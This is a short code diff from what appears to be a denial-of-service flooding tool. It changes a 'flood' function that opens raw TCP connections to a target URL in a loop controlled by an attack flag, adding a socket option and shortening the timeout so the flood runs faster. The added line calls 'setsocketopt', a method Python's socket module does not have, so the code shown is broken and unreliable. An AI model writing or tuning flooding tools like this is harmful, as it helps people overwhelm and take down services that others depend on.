@@ -43,7 +43,8 @@ async def flood(attack_id, url, stoptime) -> None:
         port = address[1]
 
     wsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    wsock.settimeout(5)
+    wsock.setsocketopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    wsock.settimeout(3)
     
     while Core.killattack:
         try: wsock.connect( (host, int(port)) ); break
